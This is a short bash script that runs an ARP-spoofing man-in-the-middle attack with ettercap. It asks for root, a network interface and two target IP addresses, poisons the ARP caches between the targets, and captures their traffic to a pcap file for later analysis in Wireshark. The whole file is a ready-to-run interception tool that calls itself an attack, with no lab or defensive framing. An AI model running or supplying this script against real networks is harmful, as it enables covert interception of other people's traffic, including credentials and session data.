#!/bin/bash

if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

echo "Enter the interface name (e.g. eth0, wlan0):"
read IFACE

if [ -z "$IFACE" ]
  then echo "Invalid interface"
  exit
fi

echo "Enter the first target IP address (e.g. 192.168.1.10):"
read TARGET1
echo "Enter the second target IP address (e.g. 192.168.1.20):"
read TARGET2

if [ -z "$TARGET1" ] || [ -z "$TARGET2" ]
  then echo "Invalid IP address"
  exit
fi

ettercap -T -M arp:remote /$TARGET1// /$TARGET2// -i $IFACE -s "scan for hosts,start sniffing,start mitm arp:remote /$TARGET1// /$TARGET2//" -w arp_spoof.pcap

echo "The attack is finished. You can find the sniffed data in arp_spoof.pcap and analyze it with Wireshark."
